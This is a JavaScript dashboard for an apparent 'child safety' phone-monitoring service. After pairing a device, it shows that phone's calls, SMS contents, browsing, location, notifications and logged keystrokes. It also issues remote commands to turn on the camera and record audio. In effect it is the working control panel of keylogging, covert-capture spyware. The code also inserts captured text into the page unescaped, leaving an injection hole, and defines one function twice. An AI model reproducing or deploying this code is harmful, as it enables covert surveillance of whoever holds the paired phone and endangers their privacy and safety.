// API Configuration
const SUPABASE_URL = 'https://gejzprqznycnbfzeaxza.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdlanpwcnF6bnljbmJmemVheHphIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5OTM2MTQsImV4cCI6MjA4OTU2OTYxNH0.zl9tfulUKL3aDbz4NjQOgOTk5JdMd8_Pf1YvHHN0SOQ';

// Load Supabase from CDN
let supabase = null;
let currentUser = null;
let selectedDevice = null;
let refreshInterval = null;

// Initialize Supabase when script loads
async function initializeSupabase() {
    try {
        // Load Supabase from CDN
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
        script.onload = () => {
            supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
            console.log('Supabase initialized');
        };
        document.head.appendChild(script);
    } catch (error) {
        console.error('Failed to initialize Supabase:', error);
    }
}

// Activity type icons and labels
const ACTIVITY_ICONS = {
    'call': '📞',
    'sms': '💬',
    'app_usage': '📱',
    'web_activity': '🌐',
    'location': '📍',
    'keyboard_input': '⌨️',
    'camera': '📷',
    'mic': '🎤',
    'notification': '🔔',
    'screen_interaction': '👆',
    'call_recording': '🎙️',
    'emergency_alert': '🚨'
};

const ACTIVITY_LABELS = {
    'call': 'Phone Call',
    'sms': 'Text Message',
    'app_usage': 'App Usage',
    'web_activity': 'Web Activity',
    'location': 'Location Update',
    'keyboard_input': 'Keyboard Input',
    'camera': 'Camera Usage',
    'mic': 'Microphone Usage',
    'notification': 'Notification',
    'screen_interaction': 'Screen Interaction',
    'call_recording': 'Call Recording',
    'emergency_alert': 'Emergency Alert'
};

// Initialize dashboard
document.addEventListener('DOMContentLoaded', function() {
    initializeSupabase();
    setupEventListeners();
    
    // Wait a bit for Supabase to load, then check auth
    setTimeout(() => {
        checkAuthState();
    }, 1000);
});

function setupEventListeners() {
    // Authentication buttons
    const loginBtn = document.getElementById('loginBtn');
    const registerBtn = document.getElementById('registerBtn');
    const showRegisterBtn = document.getElementById('showRegisterBtn');
    const showLoginBtn = document.getElementById('showLoginBtn');
    const logoutBtn = document.getElementById('logoutBtn');
    const pairDeviceBtn = document.getElementById('pairDeviceBtn');
    
    if (loginBtn) loginBtn.addEventListener('click', login);
    if (registerBtn) registerBtn.addEventListener('click', register);
    if (showRegisterBtn) showRegisterBtn.addEventListener('click', showRegister);
    if (showLoginBtn) showLoginBtn.addEventListener('click', showLogin);
    if (logoutBtn) logoutBtn.addEventListener('click', logout);
    if (pairDeviceBtn) pairDeviceBtn.addEventListener('click', pairDevice);
    
    // Enter key listeners for forms
    const loginPassword = document.getElementById('loginPassword');
    const registerPassword = document.getElementById('registerPassword');
    
    if (loginPassword) {
        loginPassword.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') login();
        });
    }
    
    if (registerPassword) {
        registerPassword.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') register();
        });
    }
    
    // Code input navigation
    const codeInputs = document.querySelectorAll('.code-digit');
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            moveToNext(this, index);
        });
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                codeInputs[index - 1].focus();
            }
        });
    });
    
    // Device selector
    const deviceSelect = document.getElementById('deviceSelect');
    if (deviceSelect) {
        deviceSelect.addEventListener('change', switchDevice);
    }
}

// Authentication state management
async function checkAuthState() {
    // Check if Supabase is loaded
    if (!supabase) {
        console.log('Supabase not loaded yet, showing auth form');
        showAuth();
        return;
    }
    
    try {
        // First check Supabase session
        const { data: { session } } = await supabase.auth.getSession();
        
        if (session) {
            currentUser = session.user;
            showDashboard();
            loadDevices();
            startAutoRefresh();
            return;
        }
    } catch (error) {
        console.log('Supabase session check failed:', error);
    }
    
    // Check for stored auth token (backend authentication)
    const authToken = localStorage.getItem('authToken');
    if (authToken) {
        try {
            // Verify token with backend
            const response = await fetch('/api/verify-token', {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${authToken}`
                }
            });
            
            if (response.ok) {
                const result = await response.json();
                currentUser = result.user;
                showDashboard();
                loadDevices();
                startAutoRefresh();
                return;
            } else {
                // Token is invalid, remove it
                localStorage.removeItem('authToken');
            }
        } catch (error) {
            console.log('Token verification failed:', error);
            localStorage.removeItem('authToken');
        }
    }
    
    // No valid authentication found
    showAuth();
}

function setupEventListeners() {
    // Enter key listeners for forms
    document.getElementById('loginPassword').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') login();
    });
    
    document.getElementById('registerPassword').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') register();
    });
    
    // Code input navigation
    const codeInputs = document.querySelectorAll('.code-digit');
    codeInputs.forEach((input, index) => {
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                codeInputs[index - 1].focus();
            }
        });
    });
}

// Authentication functions
async function login() {
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    
    if (!email || !password) {
        showError('Please fill in all fields');
        return;
    }
    
    try {
        const { data, error } = await supabase.auth.signInWithPassword({
            email,
            password
        });
        
        if (error) {
            // If Supabase login fails, try backend API
            console.log('Supabase login failed, trying backend API:', error.message);
            await loginViaBackend(email, password);
            return;
        }
        
        currentUser = data.user;
        showSuccess('Login successful!');
        showDashboard();
        loadDevices();
        startAutoRefresh();
    } catch (error) {
        console.log('Login error, trying backend API:', error.message);
        await loginViaBackend(email, password);
    }
}

// Fallback login via backend API
async function loginViaBackend(email, password) {
    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email,
                password
            })
        });
        
        const result = await response.json();
        
        if (!response.ok) {
            showError(result.error || 'Login failed');
            return;
        }
        
        // Store the token and user info
        localStorage.setItem('authToken', result.token);
        currentUser = result.user;
        
        showSuccess('Login successful!');
        showDashboard();
        loadDevices();
        startAutoRefresh();
    } catch (error) {
        showError('Login failed: ' + error.message);
    }
}

async function register() {
    const name = document.getElementById('registerName').value.trim();
    const email = document.getElementById('registerEmail').value.trim();
    const password = document.getElementById('registerPassword').value;
    
    console.log('Registration attempt for:', email);
    
    if (!name || !email || !password) {
        showError('Please fill in all fields');
        return;
    }
    
    if (password.length < 6) {
        showError('Password must be at least 6 characters');
        return;
    }
    
    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        showError('Please enter a valid email address');
        return;
    }
    
    try {
        console.log('Trying Supabase registration...');
        
        // Try direct Supabase registration first
        const { data, error } = await supabase.auth.signUp({
            email,
            password,
            options: {
                data: {
                    name: name
                }
            }
        });
        
        console.log('Supabase registration response:', { data, error });
        
        if (error) {
            console.log('Supabase registration failed:', error.message);
            // Try backend API as fallback
            await registerViaBackend(name, email, password);
            return;
        }
        
        // Check if user was created successfully
        if (data.user) {
            if (data.session) {
                // User is automatically logged in
                console.log('User registered and logged in automatically');
                currentUser = data.user;
                showSuccess('Registration successful! Welcome to the dashboard.');
                showDashboard();
                loadDevices();
                startAutoRefresh();
            } else {
                // User created but not logged in - try to sign in
                console.log('User created, attempting automatic login...');
                try {
                    const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
                        email,
                        password
                    });
                    
                    if (signInError) {
                        console.log('Auto-login failed:', signInError.message);
                        showSuccess('Registration successful! Please login with your credentials.');
                        
                        // Auto-fill login form
                        document.getElementById('loginEmail').value = email;
                        document.getElementById('loginPassword').value = password;
                        
                        showLogin();
                    } else {
                        console.log('Auto-login successful');
                        currentUser = signInData.user;
                        showSuccess('Registration and login successful!');
                        showDashboard();
                        loadDevices();
                        startAutoRefresh();
                    }
                } catch (loginError) {
                    console.log('Auto-login error:', loginError);
                    showSuccess('Registration successful! Please login with your credentials.');
                    
                    // Auto-fill login form
                    document.getElementById('loginEmail').value = email;
                    document.getElementById('loginPassword').value = password;
                    
                    showLogin();
                }
            }
        } else {
            console.log('No user data returned from Supabase');
            await registerViaBackend(name, email, password);
        }
    } catch (error) {
        console.error('Registration error:', error);
        await registerViaBackend(name, email, password);
    }
}

// Fallback registration via backend API
async function registerViaBackend(name, email, password) {
    try {
        console.log('Attempting backend registration for:', email);
        
        const response = await fetch('/api/register', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                name,
                email,
                password
            })
        });
        
        const result = await response.json();
        console.log('Backend registration response:', result);
        
        if (!response.ok) {
            showError(result.error || 'Registration failed');
            return;
        }
        
        showSuccess('Registration successful! Please login with your credentials.');
        
        // Clear registration form
        document.getElementById('registerName').value = '';
        document.getElementById('registerEmail').value = '';
        document.getElementById('registerPassword').value = '';
        
        // Auto-fill login form
        document.getElementById('loginEmail').value = email;
        document.getElementById('loginPassword').value = password;
        
        showLogin();
    } catch (error) {
        console.error('Backend registration error:', error);
        showError('Registration failed: ' + error.message);
    }
}

async function logout() {
    // Sign out from Supabase
    await supabase.auth.signOut();
    
    // Remove backend auth token
    localStorage.removeItem('authToken');
    
    currentUser = null;
    selectedDevice = null;
    stopAutoRefresh();
    showAuth();
}

// UI Navigation
function showAuth() {
    document.getElementById('authSection').style.display = 'block';
    document.getElementById('dashboardSection').style.display = 'none';
}

function showDashboard() {
    document.getElementById('authSection').style.display = 'none';
    document.getElementById('dashboardSection').style.display = 'block';
    document.getElementById('userEmail').textContent = currentUser?.email || '';
}

function showLogin() {
    document.getElementById('loginForm').classList.remove('hidden');
    document.getElementById('registerForm').classList.add('hidden');
}

function showRegister() {
    document.getElementById('loginForm').classList.add('hidden');
    document.getElementById('registerForm').classList.remove('hidden');
}

// Tab navigation
function showTab(tabName, buttonElement) {
    // If no button element provided, find it
    if (!buttonElement) {
        buttonElement = event.target;
    }
    
    // Update active tab button
    document.querySelectorAll('.nav-tabs button').forEach(btn => {
        btn.classList.remove('active');
    });
    buttonElement.classList.add('active');
    
    // Show corresponding tab pane
    document.querySelectorAll('.tab-pane').forEach(pane => {
        pane.classList.remove('active');
    });
    
    const tabPane = document.getElementById(tabName);
    if (tabPane) {
        tabPane.classList.add('active');
    }
    
    // Load tab-specific data
    loadTabData(tabName);
}

// Device management
async function loadDevices() {
    try {
        const { data: devices, error } = await supabase
            .from('devices')
            .select('*')
            .eq('parent_id', currentUser.id);
        
        if (error) {
            console.error('Error loading devices:', error);
            return;
        }
        
        const deviceSelect = document.getElementById('deviceSelect');
        deviceSelect.innerHTML = '<option value="">Select a device...</option>';
        
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.device_id;
            option.textContent = `${device.device_name} (${device.device_id})`;
            deviceSelect.appendChild(option);
        });
        
        // Auto-select first device if available
        if (devices.length > 0 && !selectedDevice) {
            selectedDevice = devices[0].device_id;
            deviceSelect.value = selectedDevice;
            loadOverviewData();
        }
    } catch (error) {
        console.error('Error loading devices:', error);
    }
}

function switchDevice() {
    selectedDevice = document.getElementById('deviceSelect').value;
    if (selectedDevice) {
        loadOverviewData();
        loadTabData(getCurrentTab());
    }
}

function getCurrentTab() {
    const activeTab = document.querySelector('.tab-pane.active');
    return activeTab ? activeTab.id : 'overview';
}

// Device pairing
function moveToNext(input, index) {
    if (input.value.length === 1 && index < 5) {
        const nextInput = document.querySelectorAll('.code-digit')[index + 1];
        if (nextInput) nextInput.focus();
    }
}

async function pairDevice() {
    const codeInputs = document.querySelectorAll('.code-digit');
    const pairingCode = Array.from(codeInputs).map(input => input.value).join('');
    
    if (pairingCode.length !== 6) {
        showError('Please enter the complete 6-digit pairing code');
        return;
    }
    
    try {
        const { data, error } = await supabase.rpc('pair_device_with_parent', {
            pairing_code_input: pairingCode,
            parent_user_id: currentUser.id
        });
        
        if (error) {
            showError('Pairing failed: ' + error.message);
            return;
        }
        
        if (data.success) {
            showSuccess(`Device "${data.device_name}" paired successfully!`);
            // Clear pairing code inputs
            codeInputs.forEach(input => input.value = '');
            // Reload devices
            loadDevices();
        } else {
            showError(data.error || 'Pairing failed');
        }
    } catch (error) {
        showError('Pairing error: ' + error.message);
    }
}

// Data loading functions
async function loadOverviewData() {
    if (!selectedDevice) return;
    
    try {
        // Load statistics
        const { data: stats, error: statsError } = await supabase.rpc('get_device_stats', {
            device_uuid: selectedDevice
        });
        
        if (!statsError && stats) {
            document.getElementById('callCount').textContent = stats.callCount || 0;
            document.getElementById('smsCount').textContent = stats.smsCount || 0;
            document.getElementById('appCount').textContent = stats.appUsageCount || 0;
            document.getElementById('webCount').textContent = stats.webActivityCount || 0;
            document.getElementById('locationCount').textContent = stats.locationCount || 0;
            document.getElementById('keyboardCount').textContent = stats.keyboardInputCount || 0;
        }
        
        // Load recent activities
        loadRecentActivities();
    } catch (error) {
        console.error('Error loading overview data:', error);
    }
}

async function loadRecentActivities() {
    if (!selectedDevice) return;
    
    try {
        const { data: activities, error } = await supabase
            .from('activities')
            .select('*')
            .eq('device_id', selectedDevice)
            .order('timestamp', { ascending: false })
            .limit(20);
        
        if (error) {
            console.error('Error loading activities:', error);
            return;
        }
        
        displayActivities(activities, 'recentActivities');
    } catch (error) {
        console.error('Error loading recent activities:', error);
    }
}

async function loadTabData(tabName) {
    if (!selectedDevice) return;
    
    switch (tabName) {
        case 'calls':
            loadCallData();
            break;
        case 'messages':
            loadMessageData();
            break;
        case 'apps':
            loadAppData();
            break;
        case 'web':
            loadWebData();
            break;
        case 'location':
            loadLocationData();
            break;
        case 'keyboard':
            loadKeyboardData();
            break;
        case 'media':
            loadMediaData();
            break;
        case 'notifications':
            loadNotificationData();
            break;
        case 'remote':
            loadRemoteCommandHistory();
            break;
    }
}

async function loadCallData() {
    if (!selectedDevice) return;
    
    try {
        const { data: activities, error } = await supabase
            .from('activities')
            .select('*')
            .eq('device_id', selectedDevice)
            .eq('activity_type', 'call')
            .order('timestamp', { ascending: false })
            .limit(50);
        
        if (error) {
            console.error('Error loading call data:', error);
            return;
        }
        
        displayActivities(activities, 'callsList');
    } catch (error) {
        console.error('Error loading call data:', error);
    }
}

async function loadMessageData() {
    if (!selectedDevice) return;
    
    try {
        const { data: activities, error } = await supabase
            .from('activities')
            .select('*')
            .eq('device_id', selectedDevice)
            .in('activity_type', ['sms', 'notification'])
            .order('timestamp', { ascending: false })
            .limit(50);
        
        if (error) {
            console.error('Error loading message data:', error);
            return;
        }
        
        displayActivities(activities, 'messagesList');
    } catch (error) {
        console.error('Error loading message data:', error);
    }
}

async function loadAppData() {
    if (!selectedDevice) return;
    
    try {
        const { data: activities, error } = await supabase
            .from('activities')
            .select('*')
            .eq('device_id', selectedDevice)
            .eq('activity_type', 'app_usage')
            .order('timestamp', { ascending: false })
            .limit(50);
        
        if (error) {
            console.error('Error loading app data:', error);
            return;
        }
        
        displayActivities(activities, 'appsList');
    } catch (error) {
        console.error('Error loading app data:', error);
    }
}

async function loadWebData() {
    if (!selectedDevice) return;
    
    try {
        const { data: activities, error } = await supabase
            .from('activities')
            .select('*')
            .eq('device_id', selectedDevice)
            .eq('activity_type', 'web_activity')
            .order('timestamp', { ascending: false })
            .limit(50);
        
        if (error) {
            console.error('Error loading web data:', error);
            return;
        }
        
        displayActivities(activities, 'webList');
    } catch (error) {
        console.error('Error loading web data:', error);
    }
}

async function loadLocationData() {
    if (!selectedDevice) return;
    
    try {
        const { data: activities, error } = await supabase
            .from('activities')
            .select('*')
            .eq('device_id', selectedDevice)
            .eq('activity_type', 'location')
            .order('timestamp', { ascending: false })
            .limit(50);
        
        if (error) {
            console.error('Error loading location data:', error);
            return;
        }
        
        displayActivities(activities, 'locationList');
    } catch (error) {
        console.error('Error loading location data:', error);
    }
}

async function loadKeyboardData() {
    if (!selectedDevice) return;
    
    try {
        const { data: activities, error } = await supabase
            .from('activities')
            .select('*')
            .eq('device_id', selectedDevice)
            .eq('activity_type', 'keyboard_input')
            .order('timestamp', { ascending: false })
            .limit(50);
        
        if (error) {
            console.error('Error loading keyboard data:', error);
            return;
        }
        
        displayActivities(activities, 'keyboardList');
    } catch (error) {
        console.error('Error loading keyboard data:', error);
    }
}

async function loadMediaData() {
    if (!selectedDevice) return;
    
    try {
        const { data: activities, error } = await supabase
            .from('activities')
            .select('*')
            .eq('device_id', selectedDevice)
            .in('activity_type', ['camera', 'mic', 'call_recording'])
            .order('timestamp', { ascending: false })
            .limit(30);
        
        if (error) {
            console.error('Error loading media data:', error);
            return;
        }
        
        displayMediaGallery(activities);
    } catch (error) {
        console.error('Error loading media data:', error);
    }
}

async function loadNotificationData() {
    if (!selectedDevice) return;
    
    try {
        const { data: activities, error } = await supabase
            .from('activities')
            .select('*')
            .eq('device_id', selectedDevice)
            .eq('activity_type', 'notification')
            .order('timestamp', { ascending: false })
            .limit(50);
        
        if (error) {
            console.error('Error loading notification data:', error);
            return;
        }
        
        displayActivities(activities, 'notificationsList');
    } catch (error) {
        console.error('Error loading notification data:', error);
    }
}

async function loadRemoteCommandHistory() {
    if (!selectedDevice) return;
    
    try {
        const { data: commands, error } = await supabase
            .from('remote_commands')
            .select('*')
            .eq('device_id', selectedDevice)
            .eq('parent_id', currentUser.id)
            .order('created_at', { ascending: false })
            .limit(20);
        
        if (error) {
            console.error('Error loading remote commands:', error);
            return;
        }
        
        displayRemoteCommands(commands);
    } catch (error) {
        console.error('Error loading remote commands:', error);
    }
}

// Display functions
function displayActivities(activities, containerId) {
    const container = document.getElementById(containerId);
    
    if (!activities || activities.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <div class="icon">📭</div>
                <p>No activities found</p>
            </div>
        `;
        return;
    }
    
    container.innerHTML = activities.map(activity => {
        const icon = ACTIVITY_ICONS[activity.activity_type] || '📱';
        const label = ACTIVITY_LABELS[activity.activity_type] || activity.activity_type;
        const time = new Date(activity.timestamp).toLocaleString();
        
        let details = '';
        if (activity.activity_data) {
            const data = typeof activity.activity_data === 'string' 
                ? JSON.parse(activity.activity_data) 
                : activity.activity_data;
            
            switch (activity.activity_type) {
                case 'call':
                    details = `${data.type || 'Unknown'} call ${data.number ? 'to/from ' + data.number : ''} - Duration: ${data.duration || 'Unknown'}`;
                    break;
                case 'sms':
                    details = `${data.type || 'Unknown'} message ${data.number ? 'to/from ' + data.number : ''}: ${data.body ? data.body.substring(0, 100) + '...' : ''}`;
                    break;
                case 'app_usage':
                    details = `App: ${data.packageName || data.appName || 'Unknown'} - Usage: ${data.duration || 'Unknown'}`;
                    break;
                case 'web_activity':
                    details = `Website: ${data.url || 'Unknown'} - Title: ${data.title || 'Unknown'}`;
                    break;
                case 'location':
                    details = `Location: ${data.address || `${data.latitude}, ${data.longitude}` || 'Unknown'}`;
                    break;
                case 'keyboard_input':
                    details = `App: ${data.appName || 'Unknown'} - Input: ${data.text ? data.text.substring(0, 50) + '...' : 'Hidden'}`;
                    break;
                case 'notification':
                    details = `App: ${data.appName || 'Unknown'} - ${data.title || ''}: ${data.text || ''}`;
                    break;
                default:
                    details = JSON.stringify(data).substring(0, 100) + '...';
            }
        }
        
        return `
            <div class="activity-item">
                <div class="activity-icon">${icon}</div>
                <div class="activity-info">
                    <div class="activity-type">${label}</div>
                    <div class="activity-details">${details}</div>
                    <div class="activity-time">${time}</div>
                </div>
            </div>
        `;
    }).join('');
}

function displayMediaGallery(activities) {
    const container = document.getElementById('mediaGallery');
    
    if (!activities || activities.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <div class="icon">📷</div>
                <p>No media files found</p>
            </div>
        `;
        return;
    }
    
    container.innerHTML = activities.map(activity => {
        const time = new Date(activity.timestamp).toLocaleString();
        const data = typeof activity.activity_data === 'string' 
            ? JSON.parse(activity.activity_data) 
            : activity.activity_data;
        
        let mediaHtml = '';
        if (activity.activity_type === 'camera' && data.imagePath) {
            mediaHtml = `<img src="${data.imagePath}" alt="Camera capture">`;
        } else if (activity.activity_type === 'mic' && data.audioPath) {
            mediaHtml = `<audio controls><source src="${data.audioPath}" type="audio/mpeg"></audio>`;
        } else {
            mediaHtml = `<div style="height: 150px; display: flex; align-items: center; justify-content: center; background: #f0f0f0;">
                ${ACTIVITY_ICONS[activity.activity_type] || '📱'}
            </div>`;
        }
        
        return `
            <div class="media-item">
                ${mediaHtml}
                <div class="media-info">
                    <strong>${ACTIVITY_LABELS[activity.activity_type] || activity.activity_type}</strong><br>
                    <small>${time}</small>
                </div>
            </div>
        `;
    }).join('');
}

function displayRemoteCommands(commands) {
    const container = document.getElementById('remoteCommandHistory');
    
    if (!commands || commands.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <div class="icon">🎛️</div>
                <p>No remote commands found</p>
            </div>
        `;
        return;
    }
    
    container.innerHTML = commands.map(command => {
        const time = new Date(command.created_at).toLocaleString();
        const completedTime = command.completed_at ? new Date(command.completed_at).toLocaleString() : null;
        
        let statusClass = '';
        let statusIcon = '';
        switch (command.status) {
            case 'completed':
                statusClass = 'status-active';
                statusIcon = '✅';
                break;
            case 'failed':
                statusClass = 'status-inactive';
                statusIcon = '❌';
                break;
            default:
                statusClass = 'status-inactive';
                statusIcon = '⏳';
        }
        
        return `
            <div class="activity-item">
                <div class="activity-icon">${statusIcon}</div>
                <div class="activity-info">
                    <div class="activity-type">${command.command_type.replace('_', ' ').toUpperCase()}</div>
                    <div class="activity-details">
                        Status: <span class="device-status ${statusClass}">${command.status}</span>
                        ${command.result ? `<br>Result: ${command.result}` : ''}
                    </div>
                    <div class="activity-time">
                        Sent: ${time}
                        ${completedTime ? `<br>Completed: ${completedTime}` : ''}
                    </div>
                </div>
            </div>
        `;
    }).join('');
}

// Remote control functions
async function activateCamera() {
    if (!selectedDevice) {
        showError('Please select a device first');
        return;
    }
    
    const cameraType = document.getElementById('cameraType').value;
    
    try {
        const { data, error } = await supabase
            .from('remote_commands')
            .insert([{
                device_id: selectedDevice,
                parent_id: currentUser.id,
                command_type: 'activate_camera',
                command_data: { camera_type: cameraType, duration: 30 }
            }]);
        
        if (error) {
            showError('Failed to send camera command: ' + error.message);
            return;
        }
        
        showSuccess('Camera activation command sent successfully!');
        loadRemoteCommandHistory();
    } catch (error) {
        showError('Error sending camera command: ' + error.message);
    }
}

async function startAudioRecording() {
    if (!selectedDevice) {
        showError('Please select a device first');
        return;
    }
    
    const duration = document.getElementById('audioDuration').value;
    
    try {
        const { data, error } = await supabase
            .from('remote_commands')
            .insert([{
                device_id: selectedDevice,
                parent_id: currentUser.id,
                command_type: 'start_audio_monitoring',
                command_data: { duration: parseInt(duration) }
            }]);
        
        if (error) {
            showError('Failed to send audio command: ' + error.message);
            return;
        }
        
        showSuccess('Audio recording command sent successfully!');
        loadRemoteCommandHistory();
    } catch (error) {
        showError('Error sending audio command: ' + error.message);
    }
}

async function requestLocation() {
    if (!selectedDevice) {
        showError('Please select a device first');
        return;
    }
    
    try {
        const { data, error } = await supabase
            .from('remote_commands')
            .insert([{
                device_id: selectedDevice,
                parent_id: currentUser.id,
                command_type: 'get_location',
                command_data: { immediate: true }
            }]);
        
        if (error) {
            showError('Failed to send location request: ' + error.message);
            return;
        }
        
        showSuccess('Location request sent successfully!');
        loadRemoteCommandHistory();
    } catch (error) {
        showError('Error sending location request: ' + error.message);
    }
}

async function sendEmergencyAlert() {
    if (!selectedDevice) {
        showError('Please select a device first');
        return;
    }
    
    if (!confirm('Send emergency alert to check child safety status?')) {
        return;
    }
    
    try {
        const { data, error } = await supabase
            .from('remote_commands')
            .insert([{
                device_id: selectedDevice,
                parent_id: currentUser.id,
                command_type: 'emergency_alert',
                command_data: { priority: 'high', message: 'Parent safety check' }
            }]);
        
        if (error) {
            showError('Failed to send emergency alert: ' + error.message);
            return;
        }
        
        showSuccess('Emergency alert sent successfully!');
        loadRemoteCommandHistory();
    } catch (error) {
        showError('Error sending emergency alert: ' + error.message);
    }
}

// Filter functions
function filterCalls() {
    // Implementation for call filtering
    loadCallData();
}

function filterMessages() {
    // Implementation for message filtering
    loadMessageData();
}

function filterApps() {
    // Implementation for app filtering
    loadAppData();
}

function filterWeb() {
    // Implementation for web filtering
    loadWebData();
}

function filterLocation() {
    // Implementation for location filtering
    loadLocationData();
}

function filterKeyboard() {
    // Implementation for keyboard filtering
    loadKeyboardData();
}

function filterMedia() {
    // Implementation for media filtering
    loadMediaData();
}

function filterNotifications() {
    // Implementation for notification filtering
    loadNotificationData();
}

// Auto-refresh functionality
function startAutoRefresh() {
    if (refreshInterval) clearInterval(refreshInterval);
    
    refreshInterval = setInterval(() => {
        if (selectedDevice) {
            loadOverviewData();
            loadTabData(getCurrentTab());
        }
    }, 30000); // Refresh every 30 seconds
}

function stopAutoRefresh() {
    if (refreshInterval) {
        clearInterval(refreshInterval);
        refreshInterval = null;
    }
}

// Utility functions
function showError(message) {
    // Remove existing messages
    document.querySelectorAll('.error, .success').forEach(el => el.remove());
    
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error';
    errorDiv.textContent = message;
    
    const container = document.querySelector('.container');
    container.insertBefore(errorDiv, container.firstChild);
    
    setTimeout(() => errorDiv.remove(), 5000);
}

function showSuccess(message) {
    // Remove existing messages
    document.querySelectorAll('.error, .success').forEach(el => el.remove());
    
    const successDiv = document.createElement('div');
    successDiv.className = 'success';
    successDiv.textContent = message;
    
    const container = document.querySelector('.container');
    container.insertBefore(successDiv, container.firstChild);
    
    setTimeout(() => successDiv.remove(), 5000);
}

// Make functions globally available
window.login = login;
window.register = register;
window.logout = logout;
window.showLogin = showLogin;
window.showRegister = showRegister;
window.showTab = showTab;
window.switchDevice = switchDevice;
window.moveToNext = moveToNext;
window.pairDevice = pairDevice;
window.activateCamera = activateCamera;
window.startAudioRecording = startAudioRecording;
window.requestLocation = requestLocation;
window.sendEmergencyAlert = sendEmergencyAlert;
window.filterCalls = filterCalls;
window.filterMessages = filterMessages;
window.filterApps = filterApps;
window.filterWeb = filterWeb;
window.filterLocation = filterLocation;
window.filterKeyboard = filterKeyboard;
window.filterMedia = filterMedia;
window.filterNotifications = filterNotifications;